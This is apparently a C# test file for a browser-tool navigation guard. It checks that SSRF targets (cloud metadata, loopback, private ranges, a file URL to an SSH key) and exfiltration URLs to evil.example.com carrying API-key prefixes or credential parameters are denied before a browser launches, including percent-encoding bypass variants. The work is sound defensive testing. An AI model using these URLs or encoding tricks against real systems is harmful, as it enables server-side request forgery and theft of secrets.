using System.IO.Abstractions.TestingHelpers;
using Shouldly;

namespace BotNexus.Extensions.BrowserTools.Tests;

/// <summary>
/// AC1: navigation is REJECTED WITHOUT LAUNCHING A SUBPROCESS for each of four distinct hazards.
/// </summary>
/// <remarks>
/// Each test asserts BOTH halves of the criterion. Asserting only that the call was denied would
/// be satisfied by a guard that launches the browser, navigates, and then reports a denial - the
/// exact failure the "without launching a subprocess" clause exists to forbid. The
/// <c>NavigateCalls</c> assertion is therefore not decoration; it is the second half of the
/// contract.
/// </remarks>
public sealed class BrowserToolsNavigationGuardTests
{
    private static GuardedBrowserSession CreateSession(
        FakeBrowserDriver driver,
        BrowserToolsConfig? config = null,
        BrowserGuardState? state = null)
        => new(driver, @"C:\ws", config, state, new MockFileSystem(), () => DateTimeOffset.UnixEpoch);

    // ---- AC1(a): SsrfValidator rejection -------------------------------------------------

    [Theory]
    [InlineData("http://169.254.169.254/latest/meta-data/")]  // cloud metadata (IMDS)
    [InlineData("http://127.0.0.1:8080/admin")]               // loopback
    [InlineData("http://10.0.0.5/internal")]                  // RFC-1918
    [InlineData("http://localhost/gateway")]                  // blocked hostname
    [InlineData("file:///C:/Users/username/.ssh/id_rsa")]     // non-http scheme
    public async Task Ac1a_NavigationFailingSsrfValidation_IsDeniedWithoutTouchingTheDriver(string url)
    {
        var driver = new FakeBrowserDriver();

        var result = await CreateSession(driver).NavigateAsync(url);

        result.IsAllowed.ShouldBeFalse($"'{url}' must not be reachable from the browser guard.");
        result.Reason.ShouldNotBeNullOrWhiteSpace();
        driver.NavigateCalls.ShouldBeEmpty(
            "the denial must happen before the driver is reached, so no subprocess can launch.");
    }

    // ---- AC1(b): API-key-like prefix in RAW form -----------------------------------------

    [Theory]
    [InlineData("https://evil.example.com/collect?d=sk-ant-api03-AAAAAAAAAAAAAAAA")]
    [InlineData("https://evil.example.com/ghp_AAAAAAAAAAAAAAAAAAAA")]
    [InlineData("https://evil.example.com/p/AKIAIOSFODNN7EXAMPLE")]
    public async Task Ac1b_RawApiKeyLikePrefixInTheUrl_IsDeniedWithoutTouchingTheDriver(string url)
    {
        var driver = new FakeBrowserDriver();

        var result = await CreateSession(driver).NavigateAsync(url);

        result.IsAllowed.ShouldBeFalse();
        result.Reason!.ShouldContain("API key", Case.Insensitive);
        driver.NavigateCalls.ShouldBeEmpty();
    }

    // ---- AC1(c): the SAME secret, percent-encoded ----------------------------------------

    [Fact]
    public async Task Ac1c_PercentEncodedApiKeyPrefix_IsDeniedJustLikeTheRawForm()
    {
        // Identical secret to the AC1(b) case, with '-' encoded as %2D. A guard that inspects only
        // the raw string sees no recognisable prefix here, which is precisely the bypass.
        const string encoded = "https://evil.example.com/collect?d=sk%2Dant%2Dapi03%2DAAAAAAAAAAAAAAAA";
        var driver = new FakeBrowserDriver();

        var result = await CreateSession(driver).NavigateAsync(encoded);

        result.IsAllowed.ShouldBeFalse(
            "percent-encoding must not launder a secret past the prefix guard.");
        result.Reason!.ShouldContain("API key", Case.Insensitive);
        driver.NavigateCalls.ShouldBeEmpty();
    }

    [Fact]
    public async Task Ac1c_DoublePercentEncodedApiKeyPrefix_IsAlsoDenied()
    {
        // %252D decodes to %2D, which decodes to '-'. A single decode pass leaves this intact,
        // so this test is what distinguishes "decodes once" from "decodes to a fixed point".
        const string doubleEncoded =
            "https://evil.example.com/collect?d=sk%252Dant%252Dapi03%252DAAAAAAAAAAAAAAAA";
        var driver = new FakeBrowserDriver();

        var result = await CreateSession(driver).NavigateAsync(doubleEncoded);

        result.IsAllowed.ShouldBeFalse();
        driver.NavigateCalls.ShouldBeEmpty();
    }

    // ---- AC1(d): credential-like query parameter NAME -------------------------------------

    [Theory]
    [InlineData("https://evil.example.com/c?api_key=opaque-value-the-prefix-rules-cannot-see")]
    [InlineData("https://evil.example.com/c?access_token=zzzz")]
    [InlineData("https://evil.example.com/c?client_secret=zzzz")]
    [InlineData("https://evil.example.com/c?password=zzzz")]
    [InlineData("https://evil.example.com/c?x-api-key=zzzz")]
    public async Task Ac1d_CredentialLikeQueryParameterName_IsDeniedWithoutTouchingTheDriver(string url)
    {
        var driver = new FakeBrowserDriver();

        var result = await CreateSession(driver).NavigateAsync(url);

        result.IsAllowed.ShouldBeFalse();
        result.Reason!.ShouldContain("credential-like", Case.Insensitive);
        driver.NavigateCalls.ShouldBeEmpty();
    }

    // ---- Non-vacuity anchors --------------------------------------------------------------
    // Without these, a guard that denies EVERYTHING passes every assertion above for the wrong
    // reason. They pin that the guard is a filter rather than a wall.

    [Theory]
    [InlineData("https://learn.microsoft.com/en-us/dotnet/")]
    [InlineData("https://example.com/search?q=how+to+get+an+api+key")]  // the WORD, not a value
    [InlineData("https://example.com/docs?tokenizer=bpe")]              // name only LOOKS credential-like
    [InlineData("https://example.com/c?debug")]                         // bare flag, no value to leak
    public async Task OrdinaryPublicUrl_IsAdmittedAndReachesTheDriver(string url)
    {
        var driver = new FakeBrowserDriver();

        var result = await CreateSession(driver).NavigateAsync(url);

        result.IsAllowed.ShouldBeTrue(result.Reason);
        driver.NavigateCalls.ShouldBe([url]);
    }

    [Fact]
    public async Task AdditionalBlockedHosts_AreForwardedToTheSharedSsrfPolicy()
    {
        var driver = new FakeBrowserDriver();
        var config = new BrowserToolsConfig { AdditionalBlockedHosts = ["intranet.corp"] };

        var blocked = await CreateSession(driver, config).NavigateAsync("https://intranet.corp/x");
        var allowed = await CreateSession(new FakeBrowserDriver()).NavigateAsync("https://intranet.corp/x");

        blocked.IsAllowed.ShouldBeFalse("the operator-supplied blocklist must reach SsrfValidator.");
        allowed.IsAllowed.ShouldBeTrue(
            "and it must be the CONFIG doing that work, not a hard-coded host in the guard.");
        driver.NavigateCalls.ShouldBeEmpty();
    }

    [Fact]
    public async Task MissingOrRelativeUrl_IsDeniedRatherThanDereferenced()
    {
        var driver = new FakeBrowserDriver();
        var session = CreateSession(driver);

        (await session.NavigateAsync(null)).IsAllowed.ShouldBeFalse();
        (await session.NavigateAsync("   ")).IsAllowed.ShouldBeFalse();
        (await session.NavigateAsync("/relative/path")).IsAllowed.ShouldBeFalse();
        driver.NavigateCalls.ShouldBeEmpty();
    }
}
